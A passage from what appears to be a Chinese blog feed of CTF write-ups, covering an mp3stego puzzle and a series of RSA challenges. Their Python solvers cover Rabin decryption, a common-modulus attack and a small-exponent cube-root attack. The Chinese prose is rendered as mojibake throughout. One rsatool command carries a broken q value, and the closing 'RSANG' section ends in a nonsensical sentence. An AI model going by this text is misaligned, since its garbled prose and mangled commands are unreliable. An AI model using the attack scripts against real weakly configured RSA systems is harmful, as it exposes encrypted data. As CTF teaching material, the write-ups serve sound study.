PSä¸€ä¸‹å°±å¥½äº†</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:45:42%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:45:42%20"></a></p><h2 id="å®¢å®˜ï¼Œå¬ç‚¹å°æ›²å„¿ï¼Ÿ"><a href="#å®¢å®˜ï¼Œå¬ç‚¹å°æ›²å„¿ï¼Ÿ" class="headerlink" title="å®¢å®˜ï¼Œå¬ç‚¹å°æ›²å„¿ï¼Ÿ"></a>å®¢å®˜ï¼Œå¬ç‚¹å°æ›²å„¿ï¼Ÿ</h2><p>è¿™é¢˜çš„mp3åœ°å€ä¸æ˜¯ç›´æ¥æä¾›çš„ï¼Œè€Œæ˜¯æä¾›äº†ä¸€ä¸ªç½‘ç«™ï¼Œç•™æ„ç½‘é¡µçš„headerï¼Œé‡Œé¢æœ‰keyä¸ºcherrsï¼Œè€Œmp3æœ€å¸¸è§çš„éšå†™æœ¯å°±æ˜¯mp3Stegoï¼Œæ‰¾ä¸€ä¸ªè§£å¯†å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode â€“X song.mp3 â€“P cheers</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdc3_#l&#123;tsf#ahfte&#125;gs:en_hmgcX_poe&#96;</span><br></pre></td></tr></table></figure><p>å°±ä¼šç”Ÿæˆæ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œå†…å®¹æ˜¯ç»è¿‡ä¸è§„åˆ™çš„æ …æ åŠ å¯†è¿‡ï¼Œåªè¦è‡ªå·±æ‰‹å·¥æŒ‰ç…§flagå½¢å¼å»è°ƒæ•´ä¸‹å³å¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_Xd&#123;hSh_ctf:mp3stego_fence##&#125;</span><br></pre></td></tr></table></figure><h2 id="ç½‘çº¢ä¹‹è·¯"><a href="#ç½‘çº¢ä¹‹è·¯" class="headerlink" title="ç½‘çº¢ä¹‹è·¯"></a>ç½‘çº¢ä¹‹è·¯</h2><p>è¿™ä¸ªæ¯”èµ›ä¹‹åæ‰åšå‡ºæ¥çš„</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:52:33%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:52:33%20"></a></p><p>æ¥ç€å°±æ˜¯ç®€å•çš„ç¼–ç é—®é¢˜äº†</p><h1 id="Finally"><a href="#Finally" class="headerlink" title="Finally"></a>Finally</h1><p>ä¸€ä¸ªå®‰å“éƒ½æ²¡åšå‡ºæ¥   å¥½å°´å°¬ã€‚ã€‚ã€‚ã€‚</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-11/99289129.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-11/99289129.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åå±±æ¯CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€å¤§æ³¢RSAå°±è¦æ¥äº†~~</title>
      <link href="Common-types-of-RSA.html"/>
      <url>Common-types-of-RSA.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="å…ˆä¸è¯´RSAåŸç†-æˆ‘ä¹Ÿæ‡’å¾—é‡å¤çš„é€ è½®å­"><a href="#å…ˆä¸è¯´RSAåŸç†-æˆ‘ä¹Ÿæ‡’å¾—é‡å¤çš„é€ è½®å­" class="headerlink" title="å…ˆä¸è¯´RSAåŸç†  æˆ‘ä¹Ÿæ‡’å¾—é‡å¤çš„é€ è½®å­"></a>å…ˆä¸è¯´RSAåŸç†  æˆ‘ä¹Ÿæ‡’å¾—é‡å¤çš„é€ è½®å­</h1><h1 id="RSAâ€“æ±‚d"><a href="#RSAâ€“æ±‚d" class="headerlink" title="RSAâ€“æ±‚d"></a>RSAâ€“æ±‚d</h1><p>åœ¨ä¸€æ¬¡RSAå¯†é’¥å¯¹ç”Ÿæˆä¸­ï¼Œå‡è®¾p=473398607161ï¼Œq=4511491ï¼Œe=17</p><p>æ±‚è§£å‡ºd</p><p>å°†å¾—åˆ°çš„dæäº¤ï¼š</p><p>é¢˜ç›®å¾ˆç®€å• æœ‰å–å·§çš„æ–¹æ³• ä¹Ÿæœ‰ç¬¨æ–¹æ³•</p><h2 id="è‡ªå·±ä»£ç è§£å†³-ç¬¨åŠæ³•"><a href="#è‡ªå·±ä»£ç è§£å†³-ç¬¨åŠæ³•" class="headerlink" title="è‡ªå·±ä»£ç è§£å†³  ç¬¨åŠæ³•"></a>è‡ªå·±ä»£ç è§£å†³  ç¬¨åŠæ³•</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = int(raw_input(<span class="string">&quot;Enter a p: &quot;</span>))   </span><br><span class="line">q = int(raw_input(<span class="string">&quot;Enter a q: &quot;</span>))  </span><br><span class="line">e = int(raw_input(<span class="string">&quot;Enter a e: &quot;</span>))   </span><br><span class="line">t = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)   </span><br><span class="line">i=<span class="number">0</span>  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span> :   </span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span>-t*i)%e == <span class="number">0</span>:   </span><br><span class="line"><span class="keyword">break</span>   </span><br><span class="line">i-=<span class="number">1</span>   </span><br><span class="line"><span class="keyword">print</span> i </span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;ok:&#x27;</span> + <span class="string">&#x27;%d&#x27;</span> % ((<span class="number">1</span>-t*i)/e)</span><br></pre></td></tr></table></figure><p>è„šæœ¬å†™å¾—è€ç²—ç³™</p><h2 id="pythonæ¨¡å—è§£å†³"><a href="#pythonæ¨¡å—è§£å†³" class="headerlink" title="pythonæ¨¡å—è§£å†³"></a>pythonæ¨¡å—è§£å†³</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = int(raw_input(<span class="string">&quot;Enter a p: &quot;</span>))   </span><br><span class="line">q = int(raw_input(<span class="string">&quot;Enter a q: &quot;</span>))  </span><br><span class="line">e = int(raw_input(<span class="string">&quot;Enter a e: &quot;</span>))   </span><br><span class="line">gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)) `</span><br></pre></td></tr></table></figure><h2 id="åˆ«äººå·²ç»å†™å¥½çš„å·¥å…·-å³rsatool-py"><a href="#åˆ«äººå·²ç»å†™å¥½çš„å·¥å…·-å³rsatool-py" class="headerlink" title="åˆ«äººå·²ç»å†™å¥½çš„å·¥å…· å³rsatool.py"></a>åˆ«äººå·²ç»å†™å¥½çš„å·¥å…· å³rsatool.py</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsatool.py -p <span class="number">473398607161</span> -q <span class="number">451149</span> <span class="number">84376578389</span> -e <span class="number">17</span> </span><br></pre></td></tr></table></figure><h1 id="åŸºç¡€æ±‚æ˜æ–‡-Nå·²ç»è¢«åˆ†è§£"><a href="#åŸºç¡€æ±‚æ˜æ–‡-Nå·²ç»è¢«åˆ†è§£" class="headerlink" title="åŸºç¡€æ±‚æ˜æ–‡-Nå·²ç»è¢«åˆ†è§£"></a>åŸºç¡€æ±‚æ˜æ–‡-Nå·²ç»è¢«åˆ†è§£</h1><p>åœ¨ä¸€æ¬¡RSAå¯†é’¥å¯¹ç”Ÿæˆä¸­ï¼Œå‡è®¾p=473398607161ï¼Œq=4511491ï¼Œe=17</p><p>æŸä¸ªæ˜æ–‡åŠ å¯†åçš„ç»“æœä¸ºï¼š727835100378484285<br>å°†å¾—åˆ°çš„æ˜æ–‡æäº¤ï¼š<br>æ—¢ç„¶ä»¥åŠæœ‰äº†pï¼Œqé‚£ä¹ˆå°±å¯ä»¥æ‹¿åˆ°ç§é’¥äº†</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rsatool.py -p <span class="number">473398607161</span> -q <span class="number">4511491</span> -e <span class="number">17</span></span><br><span class="line">Using (p, q) to initialise RSA instance</span><br><span class="line"></span><br><span class="line">n = <span class="number">2135733555619387051</span> (<span class="number">0x1da3a65a6d9356ab</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">17</span> (<span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="number">125631357777427553</span> (<span class="number">0x1be550de4f93c61</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">473398607161</span> (<span class="number">0x6e38c17d39</span>)</span><br><span class="line"></span><br><span class="line">q = <span class="number">4511491</span> (<span class="number">0x44d703</span>)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> (<span class="string">&#x27;%x&#x27;</span> % pow(<span class="number">727835100378484285</span>,<span class="number">125631357777427553</span>,<span class="number">2135733555619387051</span>)).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">testMe!</span><br></pre></td></tr></table></figure><h1 id="åŸºç¡€æ±‚æ˜æ–‡-Næœªè¢«åˆ†è§£"><a href="#åŸºç¡€æ±‚æ˜æ–‡-Næœªè¢«åˆ†è§£" class="headerlink" title="åŸºç¡€æ±‚æ˜æ–‡-Næœªè¢«åˆ†è§£"></a>åŸºç¡€æ±‚æ˜æ–‡-Næœªè¢«åˆ†è§£</h1><p>N = 322831561921859ï¼Œ e = 23ï¼Œcipher = 0xdc2eeeb2782c</p><p>é¢˜ç›®æ²¡æœ‰ä¸Šä¸€é¢˜ç»™çš„pï¼Œå’Œqï¼Œæ‰€ä»¥å¾—å¯¹Nè¿›è¡Œåˆ†è§£ </p><h2 id="yafué…åˆrsatool-py-python"><a href="#yafué…åˆrsatool-py-python" class="headerlink" title="yafué…åˆrsatool.py + python"></a>yafué…åˆrsatool.py + python</h2><p>è¿™ä¸ªé¢˜ç›®å’Œä¸Šé¢é¢˜ç›®çš„åŒºåˆ«å°±æ˜¯Næ²¡æœ‰è¢«åˆ†è§£ ç”¨<code>yafu</code>è¿™ä¸ªå·¥å…·å¯ä»¥è¿›è¡Œå¤§æ•°å­—åˆ†è§£<br><a href="http://oayoilchh.bkt.clouddn.com/RSA_yafu.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/RSA_yafu.png"></a><br>ç„¶åå‰©ä¸‹çš„æ–¹æ³•å’Œä¸Šé¢å·®ä¸å¤šå°±ä¸ç´¯åŠ å™è¿°äº†</p><h1 id="512ä½çš„å¤§å®¶ä¼™"><a href="#512ä½çš„å¤§å®¶ä¼™" class="headerlink" title="512ä½çš„å¤§å®¶ä¼™"></a>512ä½çš„å¤§å®¶ä¼™</h1><p>ä½ æ²¡çœ‹é”™ï¼Œè¿™è¿˜çœŸæ˜¯å¯†ç å­¦ç³»åˆ—äº†ï¼Œç›¸ä¿¡ä½ å·²ç»è§£å‡ºå‰ä¸¤é¢˜äº†ï¼Œé‚£ä¹ˆç»§ç»­çœ‹è¿™é¢˜å§ã€‚<br>é“¾æ¥ï¼š<a href="http://pan.baidu.com/s/1o77LozK">http://pan.baidu.com/s/1o77LozK</a> å¯†ç ï¼š1ik4</p><p>è¿™ä¸ªé¢˜ç›®ç¬¬ä¸€æ¬¡é‡åˆ°çš„æ—¶å€™æˆ‘ç¢°åˆ°äº†ä¸€ä¸ªéº»çƒ¦ å°±æ˜¯ä¸çŸ¥æ€ä¹ˆæå–å…¬é’¥<br>ä¸¤ä¸ªæ–¹æ³•</p><h2 id="Pythonè§£å†³"><a href="#Pythonè§£å†³" class="headerlink" title="Pythonè§£å†³"></a>Pythonè§£å†³</h2><p>åˆ©ç”¨pythonçš„<code>Crypto</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">A = RSA.importKey(open(<span class="string">&#x27;pemæ–‡ä»¶åå­—&#x27;</span>).read())</span><br><span class="line">A.n</span><br><span class="line">A.e</span><br></pre></td></tr></table></figure><p>å¦‚å›¾ å°±å¾—åˆ°äº†å…¬é’¥<br><a href="http://oayoilchh.bkt.clouddn.com/RSA_Publkey.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/RSA_Publkey.png"></a><br>ç„¶åå‰©ä¸‹çš„æ­¥éª¤ä¾æ—§å°±æ˜¯ åˆ†è§£N ç”Ÿæˆç§é’¥ è§£å¯†</p><h2 id="opensslè§£å†³"><a href="#opensslè§£å†³" class="headerlink" title="opensslè§£å†³"></a>opensslè§£å†³</h2><p>æå–å…¬é’¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -outform PEM -in server&#x2F;server.crt -pubkey -out server&#x2F;server.pubkey</span><br></pre></td></tr></table></figure><h1 id="hard-RSA"><a href="#hard-RSA" class="headerlink" title="hard RSA"></a>hard RSA</h1><p>ç›¸ä¿¡ä½ å·²ç»åšå‡ºäº†medium RSAï¼Œè¿™é¢˜çš„pubkeyåœ¨medium RSAçš„åŸºç¡€ä¸Šæˆ‘åšäº†ç‚¹æ‰‹è„šï¼Œç»§ç»­æŒ‘æˆ˜å§ã€‚<br>Hint1: 1.ä¸éœ€è¦çˆ†ç ´ã€‚2.ç”¨ä½ çš„æ•°å­¦çŸ¥è¯†è§£å†³æ­¤é¢˜ã€‚3.éš¾é“å¤§å®¶éƒ½ä¸ä¼šå¼€æ ¹å·å—ï¼Ÿ<br>é“¾æ¥ï¼š<a href="http://pan.baidu.com/s/1kVxYmiV">http://pan.baidu.com/s/1kVxYmiV</a> å¯†ç ï¼šoix5</p><p> è€ƒéªŒå¤§å®¶æ•°å­¦çŸ¥è¯†çš„æ¥äº†</p><p>è¿™ä¸ªé¢˜ç›®å’Œä¸Šä¸ªé¢˜ç›®çš„ç›¸åŒä¹‹å¤„æ˜¯ Næ˜¯ä¸€æ ·çš„ ä½†æ˜¯è¿™ä¸ªé¢˜ç›®çš„ e = 2<br>eä¸€æ · è¿™ä¸ªé¢˜ç›®åº”è¯¥æ˜¯    <code>Rabin</code>å¯†ç <br><a href="http://oayoilchh.bkt.clouddn.com/RSA_Rabin.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/RSA_Rabin.png"></a><br>ç›´æ¥ç»™è„šæœ¬</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">f = open(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">c = libnum.s2n(c)</span><br><span class="line">p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">n = p*q</span><br><span class="line">r = pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">s = pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">a = gmpy2.invert(p,q)</span><br><span class="line">b = gmpy2.invert(q,p)</span><br><span class="line">x =(a*p*s+b*q*r)%n</span><br><span class="line">y =(a*p*s-b*q*r)%n</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(x%n)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s((-x)%n)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(y%n)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s((-y)%n)</span><br></pre></td></tr></table></figure><h1 id="Very-Hard-RSA"><a href="#Very-Hard-RSA" class="headerlink" title="Very Hard RSA"></a>Very Hard RSA</h1><p>å‰å‡ é¢˜å› ä¸ºNå¤ªå°ï¼Œéƒ½è¢«ä½ æ”»ç ´äº†ï¼Œå‡ºé¢˜äººè¿™æ¬¡æ¥äº†ä¸ªRSA4096ï¼Œæ˜¯å¦æ¥å—æŒ‘æˆ˜å°±çœ‹ä½ äº†ã€‚<br>é“¾æ¥ï¼š<a href="http://pan.baidu.com/s/1jIq8IKA">http://pan.baidu.com/s/1jIq8IKA</a> å¯†ç ï¼šk43g</p><p>å¯¹äºè¿™ä¸ªé¢˜ç›® æˆ‘ä»¬ä¼šå‘ç° æ˜¯ç”¨ç›¸åŒçš„Nï¼Œä¸åŒçš„eè¿›è¡ŒåŠ å¯†çš„ </p><p>è¿™é‡Œæœ‰ä¸ªæŠ€å·§ å¦‚æœæˆ‘ä»¬å‘ç° Nç›¸åŒ eä¸åŒå…¶å®æˆ‘ä»¬å¯ä»¥ç”¨å…±æ¨¡æ”»å‡»</p><p>åŸç†ä¸è¯´ ç›´æ¥ç»™è„šæœ¬</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  <span class="comment"># è¾“å…¥å‚æ•°</span></span><br><span class="line">  <span class="comment"># fo1 = open(&#x27;flag.enc1&#x27;, &#x27;rb&#x27;)</span></span><br><span class="line">  <span class="comment"># fo2 = open(&#x27;flag.enc2&#x27;, &#x27;rb&#x27;)</span></span><br><span class="line">  <span class="comment"># c1 =  fo1.read()</span></span><br><span class="line">  <span class="comment"># c2 =  fo2.read()</span></span><br><span class="line">  n = <span class="number">116547141139745534253172934123407786743246513874292261984447028928003798881819567221547298751255790928878194794155722543477883428672342894945552668904410126460402501558930911637857436926624838677630868157884406020858164140754510239986466552869866296144106255873879659676368694043769795604582888907403261286211</span></span><br><span class="line">  c1 = <span class="number">78552378607874335972488545767374401332953345586323262531477516680347117293352843468592985447836452620945707838830990843415342047337735534418287912723395148814463617627398248738969202758950481027762126608368555442533803610260859075919831387641824493902538796161102236794716963153162784732179636344267189394853</span></span><br><span class="line">  c2 = <span class="number">98790462909782651815146615208104450165337326951856608832305081731255876886710141821823912122797166057063387122774480296375186739026132806230834774921466445172852604926204802577270611302881214045975455878277660638731607530487289267225666045742782663867519468766276566912954519691795540730313772338991769270201</span></span><br><span class="line">  e1 = <span class="number">1804229351</span></span><br><span class="line">  e2 = <span class="number">17249876309</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="comment"># æ±‚æ¨¡åå…ƒç´ </span></span><br><span class="line">  <span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = pow(c1,s1,n)*pow(c2,s2,n) % n</span><br><span class="line">  <span class="keyword">print</span> n2s(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Extremely-hard-RSA"><a href="#Extremely-hard-RSA" class="headerlink" title="Extremely hard RSA"></a>Extremely hard RSA</h1><p>æ²¡æƒ³åˆ°RSA4096éƒ½è¢«ä½ ç»™ç ´äº†ï¼Œä¸€å®šæ˜¯æˆ‘çš„é—®é¢˜ï¼Œç»™äº†ä½ å¤ªå¤šä¿¡æ¯ï¼Œè¿™æ¬¡æˆ‘åªç»™ä½ ä¸€ä¸ªflagçš„åŠ å¯†å€¼å’Œå…¬é’¥ï¼Œä»ç„¶æ˜¯RSA4096ï¼Œæˆ‘å°±ä¸ä¿¡ä½ è¿˜èƒ½è§£å‡ºæ¥ã€‚<br>é“¾æ¥ï¼š<a href="http://pan.baidu.com/s/1skBIUuD">http://pan.baidu.com/s/1skBIUuD</a> å¯†ç ï¼šxvfr<br> é¢˜ç›®çš„é‡ç‚¹æ˜¯ï¼š<br>å…¬é’¥ä¸­ï¼Œe=3ï¼ŒNéå¸¸å¤§ã€‚æ‰€ä»¥å¯ä»¥ä¸æ–­åœ°c+Nç„¶åå¼€ä¸‰æ¬¡æ–¹ï¼Œç›´æ¥å†™ä»£ç çˆ†ç ´<br>è¿™é‡Œç›´æ¥ç”¨ç™½å¸ˆå‚…å†™çš„çš„è„šæœ¬  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;ByStudent&#x27;</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n,n2s</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line">n = <span class="number">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">f = open(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c= f.read()</span><br><span class="line">c = s2n(c)</span><br><span class="line">f.close()</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = iroot(c+i*n,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">print</span> res</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;i=&quot;</span>+str(i)</span><br><span class="line">    i = i+<span class="number">1</span></span><br><span class="line"><span class="comment">#i=118719487</span></span><br><span class="line">m = <span class="number">440721643740967258786371951429849843897639673893942371730874939742481383302887786063966117819631425015196093856646526738786745933078032806737504580146717737115929461581126895844008044713461807791172016433647699394456368658396746134702627548155069403689581548233891848149612485605022294307233116137509171389596747894529765156771462793389236431942344003532140158865426896855377113878133478689191912682550117563858186</span></span><br><span class="line"><span class="keyword">print</span> n2s(m)</span><br><span class="line"><span class="comment"># ç»“æœ</span></span><br><span class="line"><span class="comment"># Didn&#x27;t you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: PCTF&#123;Sm4ll_3xpon3nt_i5_W3ak&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Gold-LIke-RSA"><a href="#Gold-LIke-RSA" class="headerlink" title="Gold LIke RSA"></a>Gold LIke RSA</h1><p>è¿™ä¸ªé¢˜æ˜¯åˆ°æœ€å iæ˜¥ç§‹æŠŠæ±ªå¸ˆå‚…çš„é¢˜ä¸Šä¸Šå»ä¹‹åæˆ‘æ‰ç»ˆäºåšå‡ºæ¥çš„</p><p>æ—¢ç„¶ä½ é€¼æˆ‘åˆ°ç»å¢ƒï¼Œé‚£å°±ä¼‘æ€ªæˆ‘ä¸å®¢æ°”äº†ï¼Œä»£è¡¨ä¸Šå¸æŒ‘æˆ˜ä½ ~<br>é“¾æ¥ï¼š<a href="http://pan.baidu.com/s/1qX7HmyS">http://pan.baidu.com/s/1qX7HmyS</a> å¯†ç ï¼š4vjz</p><p>åæ¥æ‰çŸ¥é“è¿™ä¸ªé¢˜æ˜¯PCTFçš„ä¸€é“é¢˜ç›®æ”¹çš„  <a href="http://mslc.ctf.su/wp/plaidctf-2014-rsa-writeup/">åŸé¢˜åœ°å€</a><br>å…ˆåœåœ¨è¿™ æ˜å¤©åœ¨å†™ </p><h1 id="RSANG"><a href="#RSANG" class="headerlink" title="RSANG"></a>RSANG</h1><p>å°è¯•ç€å¯¹Nåˆ†è§£<br>æ¨¡é‡å¯¹æ•°<br>çœ‹èµ·æ¥åƒå½¢å¼çš„æ•°å­—$N = (2^M + a)(2^M + b)(2^M + c)(2^M + d) $.<br>æ—¥å¿—åŸº 2 çš„å¼¹æ€§æ¨¡é‡æ˜¯ 5568 